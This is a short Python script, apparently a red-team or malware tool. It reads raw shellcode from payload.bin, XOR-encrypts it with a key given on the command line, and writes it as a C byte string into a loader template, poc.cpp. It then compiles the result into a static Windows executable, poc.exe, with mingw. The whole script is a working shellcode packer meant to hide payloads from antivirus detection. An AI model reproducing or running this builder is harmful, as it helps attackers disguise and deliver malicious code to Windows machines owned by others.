import sys
import string
import os
import base64
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('key', help='key to encrypt the payload with.')
args = parser.parse_args()
secret_key = args.key
print("The payload will be xor with this key : " + secret_key)

def read_source():
        source = open("poc.cpp", "rt")
        data = source.read()
        return data
        source.close()

def read_shellcode():
        payload = open("payload.bin", "rb")
        data = payload.read()
        return data
        payload.close()

# Convert payload in base64 
#def convert_base64():
#        payload = open("payload.bin", "rb")
#        data = payload.read()
#        data = base64.b64encode(data)
#        return data
#        payload.close()

def xor_encrypt():
        payload = open("payload.bin", "rb")
        data = payload.read()
        key = secret_key # Key for the exection of the exe
        key_stream = [ord(key[i % len(key)]) for i in range(len(data))]
        encrypted_bytes = bytes([a ^ b for a, b in zip(data, key_stream)])
        return encrypted_bytes
        payload.close()

def main():
        source = read_source()

        payload = xor_encrypt()
        format_payload =  '"\\x' + '\\x'.join(hex(x)[2:] for x in payload) + '";' # Transformation of the payload to use the right format 

        #print(source)
        print(format_payload)

        new_code = source.replace('unsigned char shellcode[] = "";', 'unsigned char shellcode[] = ' + format_payload) # add the payload in the new-poc.cpp

        #print(new_code)

        pwn = open("new-poc.cpp", "w+")
        pwn.write(new_code)
        pwn.close()

        os.system("x86_64-w64-mingw32-g++ --static new-poc.cpp -o poc.exe") 

if __name__ == "__main__":
        main()
